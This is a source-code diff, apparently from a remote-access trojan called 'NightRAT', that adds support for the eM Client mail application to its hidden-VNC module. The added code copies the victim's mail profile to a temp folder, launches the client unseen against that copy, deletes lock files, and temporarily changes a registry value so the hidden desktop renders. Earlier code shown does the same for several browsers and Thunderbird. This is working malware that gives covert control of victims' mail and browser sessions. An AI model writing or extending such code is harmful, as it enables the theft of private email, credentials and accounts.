@@ -75,6 +75,10 @@ static const uint32_t FRAME_FORMAT_JPEG_COMPRESSED = 3;
 static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;
 
 static atomic_bool g_captureRunning(false);
+static atomic<DWORD> g_spawnedMailClientPid(0);
+static DWORD g_originalWpfHwAccel = 0;
+static bool g_hasOriginalWpfHwAccel = false;
+static bool g_wpfHwAccelPatched = false;
 static thread g_captureThread;
 static mutex g_captureMutex;
 static mutex g_sendMutex;
@@ -690,6 +694,24 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
     return false;
 }
 
+static bool GetProcessNameByPid(DWORD pid, wstring& outName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (pe32.th32ProcessID == pid) {
+                outName = pe32.szExeFile;
+                CloseHandle(hSnap);
+                return true;
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+    return false;
+}
+
 static void kill_process_by_name(const wstring& exeName) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
@@ -944,6 +966,33 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD pid = 0;
+                GetWindowThreadProcessId(hwnd, &pid);
+                bool isMailClient = false;
+                if (pid != 0) {
+                    if (pid == g_spawnedMailClientPid.load()) {
+                        isMailClient = true;
+                    } else {
+                        wstring procName;
+                        if (GetProcessNameByPid(pid, procName)) {
+                            if (_wcsicmp(procName.c_str(), L"MailClient.exe") == 0) {
+                                isMailClient = true;
+                            }
+                        }
+                    }
+                }
+
+                if (isMailClient) {
+                    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                    if ((style & WS_CAPTION) && (style & WS_SYSMENU)) {
+                        if (IsIconic(hwnd)) {
+                            ShowWindow(hwnd, SW_RESTORE);
+                            SetForegroundWindow(hwnd);
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -1905,11 +1954,12 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"Opera" || browserName == L"Opera GX" || browserName == L"eM Client") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
-        else path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"Opera GX") path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"eM Client") path += L"\\eM Client";
         return path;
     } else {
         if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
@@ -2079,6 +2129,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         initialize_visual_styles();
 
         if (action == "hvnc_start") {
+            // Set Avalon.Graphics DisableHWAcceleration to 1 for the whole VNC session to support WPF apps (eM Client, etc.)
+            HKEY hKeyWpf = NULL;
+            if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKeyWpf, NULL) == ERROR_SUCCESS) {
+                DWORD dwType = 0;
+                DWORD dwSize = sizeof(DWORD);
+                if (RegQueryValueExW(hKeyWpf, L"DisableHWAcceleration", NULL, &dwType, (LPBYTE)&g_originalWpfHwAccel, &dwSize) == ERROR_SUCCESS) {
+                    g_hasOriginalWpfHwAccel = true;
+                } else {
+                    g_hasOriginalWpfHwAccel = false;
+                }
+                DWORD disableVal = 1;
+                RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&disableVal, sizeof(DWORD));
+                g_wpfHwAccelPatched = true;
+                RegCloseKey(hKeyWpf);
+            }
+
             g_scalePercent = cmd.value("quality", 50);
             if (g_scalePercent < 10) g_scalePercent = 10;
             if (g_scalePercent > 100) g_scalePercent = 100;
@@ -2131,9 +2197,23 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
             g_lastInteractiveFullFrameTick = 0;
+            g_spawnedMailClientPid = 0;
             {
                 lock_guard<mutex> lock(g_inputMutex);
                 g_inputQueue.clear();
+            }
+
+            if (g_wpfHwAccelPatched) {
+                HKEY hKeyWpf = NULL;
+                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, KEY_ALL_ACCESS, &hKeyWpf) == ERROR_SUCCESS) {
+                    if (g_hasOriginalWpfHwAccel) {
+                        RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&g_originalWpfHwAccel, sizeof(DWORD));
+                    } else {
+                        RegDeleteValueW(hKeyWpf, L"DisableHWAcceleration");
+                    }
+                    RegCloseKey(hKeyWpf);
+                }
+                g_wpfHwAccelPatched = false;
             }
         } else if (action == "hvnc_quality") {
             lock_guard<mutex> lock(g_captureMutex);
@@ -2156,7 +2236,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2259,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2225,6 +2307,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             } else if (wRequestedPath == L"Thunderbird") {
                                 exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
                                 if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+                            } else if (wRequestedPath == L"eM Client") {
+                                exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
                             }
                         }
                     }
@@ -2274,6 +2359,33 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                         profilePath = tempProfileRoot;
 
+                    } else if (wRequestedPath == L"eM Client" && copyProfile) {
+                        wchar_t szPath[MAX_PATH];
+                        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
+                            wstring sourceUserData = wstring(szPath) + L"\\eM Client";
+                            if (fs::exists(sourceUserData)) {
+                                wchar_t tempPath[MAX_PATH];
+                                GetTempPathW(MAX_PATH, tempPath);
+                                wstring tempProfileRoot = tempPath;
+                                tempProfileRoot += L"NightRAT_emclient_Profile";
+
+                                try {
+                                    if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
+                                } catch (...) {}
+
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy eM Client profile.");
+                                    return;
+                                }
+                                profilePath = tempProfileRoot;
+                            } else {
+                                send_error("eM Client Profile directory not found.");
+                                return;
+                            }
+                        } else {
+                            send_error("Failed to retrieve APPDATA directory.");
+                            return;
+                        }
                     } else if (copyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
@@ -2319,7 +2431,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX" || wRequestedPath == L"eM Client")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2344,6 +2456,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
+                    } else if (wRequestedPath == L"eM Client") {
+                        args = L"";
+                        if (!profilePath.empty()) {
+                            args += L" /dblocation \"" + profilePath + L"\"";
+                        }
+                        args += L" /localmutex";
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
                         args = L" --remote-debugging-port=9222";
@@ -2430,6 +2548,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
+                            } else if (wRequestedPath == L"eM Client") {
+                                // eM Client locks usually aren't standard Chromium lock files.
+                                // But they use SQLite and might leave WAL/SHM locks or custom Lock files.
+                                // Clean SQLite write-ahead-logs to prevent startup/recovery crashes.
+                                try {
+                                    for (const auto& entry : fs::recursive_directory_iterator(profilePath)) {
+                                        if (entry.is_regular_file()) {
+                                            wstring ext = entry.path().extension().wstring();
+                                            if (ext == L".wal" || ext == L".shm" || ext == L".lock") {
+                                                fs::remove(entry.path());
+                                            }
+                                        }
+                                    }
+                                } catch (...) {}
                             } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
@@ -2463,8 +2595,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    // For eM Client and other complex assemblies, we should pass the executable's parent directory as the current working directory
+                    wstring workingDir;
+                    try {
+                        workingDir = fs::path(exePath).parent_path().wstring();
+                    } catch (...) {
+                        workingDir = L"";
+                    }
+                    const wchar_t* lpCurrentDirectory = workingDir.empty() ? NULL : workingDir.c_str();
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                                       0, NULL, lpCurrentDirectory, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_spawnedMailClientPid = pi.dwProcessId;
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
